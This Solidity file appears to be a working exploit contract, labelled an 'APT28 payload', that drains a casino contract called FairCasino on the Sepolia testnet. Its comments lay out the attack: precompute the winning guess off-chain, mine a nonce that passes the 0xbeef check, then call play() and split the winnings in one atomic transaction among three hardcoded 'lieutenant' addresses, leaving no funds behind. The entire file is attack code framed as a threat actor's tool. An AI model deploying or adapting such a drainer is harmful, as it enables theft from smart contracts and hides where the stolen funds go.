// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// ─── IDrainer (per APT28 README spec) ────────────────────────────────────────
interface IDrainer {
    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable;
    function distribute() external;
}

// ─── External targets ────────────────────────────────────────────────────────
interface IFairCasino {
    function play(uint256 guess, uint256 round, uint256 nonce) external payable;
    function currentRound() external view returns (uint256);
    function jackpotReserve() external view returns (uint256);
}

interface IAggregatorV3 {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

// ─── Drainer ─────────────────────────────────────────────────────────────────
/**
 * @title Drainer
 * @notice APT28 payload — drains FairCasino atomically and splits proceeds 50/30/20.
 *
 * Strategy:
 *   1. Off-chain, the operator computes `guess = keccak256(secretTarget XOR price, gameSalt, currentRound)`
 *      and mines `nonce` such that the last 2 bytes of keccak256(this, nonce, guess, round) == 0xbeef.
 *   2. `attack()` forwards exactly TICKET_PRICE (0.01 ETH) to FairCasino.play() with the precomputed
 *      arguments. On a winning guess, FairCasino transfers the payout to this contract.
 *   3. `distribute()` is invoked at the tail of `attack()` so the entire flow (extraction + redistribution)
 *      executes in a single, atomic transaction. No funds remain on this contract or on the operator EOA.
 *   4. If the round/price has shifted between off-chain computation and on-chain execution, FairCasino's
 *      `signature == 0xbeef` requirement reverts the call, refunding the 0.01 ETH ticket.
 */
contract Drainer is IDrainer {
    // ─── Targets (Sepolia) ────────────────────────────────────────────────────
    address public constant TARGET = 0xed5415679D46415f6f9a82677F8F4E9ed9D1302b;
    address public constant ORACLE = 0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43;

    // ─── Lieutenants (mandatory distribution schema) ──────────────────────────
    address payable public constant LT1 = payable(0x1acB0745a139C814B33DA5cdDe2d438d9c35060E); // 50%
    address payable public constant LT2 = payable(0xbE99BCD0D8FdE76246eaE82AD5eF4A56b42c6B7d); // 30%
    address payable public constant LT3 = payable(0xA791D68A0E2255083faF8A219b9002d613Cf0637); // 20%

    // ─── Constants ────────────────────────────────────────────────────────────
    uint256 public constant TICKET_PRICE = 0.01 ether;

    // ─── Events ───────────────────────────────────────────────────────────────
    event Strike(uint256 indexed round, uint256 payout);
    event Distributed(uint256 toLT1, uint256 toLT2, uint256 toLT3);

    /// @notice Helper: read the public state needed off-chain to mine a valid (guess, nonce).
    /// @return round  Current FairCasino round.
    /// @return price  Latest Chainlink BTC/USD answer (8 decimals, int256).
    function readState() external view returns (uint256 round, int256 price) {
        round = IFairCasino(TARGET).currentRound();
        (, price, , , ) = IAggregatorV3(ORACLE).latestRoundData();
    }

    /// @inheritdoc IDrainer
    function attack(uint256 _guess, uint256 _round, uint256 _nonce) external payable override {
        require(msg.value >= TICKET_PRICE, "Drainer: send >= 0.01 ETH");

        IFairCasino(TARGET).play{value: TICKET_PRICE}(_guess, _round, _nonce);

        uint256 bal = address(this).balance;
        emit Strike(_round, bal);

        if (bal > 0) {
            _distribute(bal);
        }
    }

    /// @inheritdoc IDrainer
    function distribute() external override {
        uint256 bal = address(this).balance;
        require(bal > 0, "Drainer: nothing to distribute");
        _distribute(bal);
    }

    function _distribute(uint256 bal) internal {
        uint256 amount1 = (bal * 50) / 100;
        uint256 amount2 = (bal * 30) / 100;
        uint256 amount3 = bal - amount1 - amount2;

        (bool ok1, ) = LT1.call{value: amount1}("");
        (bool ok2, ) = LT2.call{value: amount2}("");
        (bool ok3, ) = LT3.call{value: amount3}("");
        require(ok1 && ok2 && ok3, "Drainer: distribution failed");

        emit Distributed(amount1, amount2, amount3);
    }

    receive() external payable {}
}
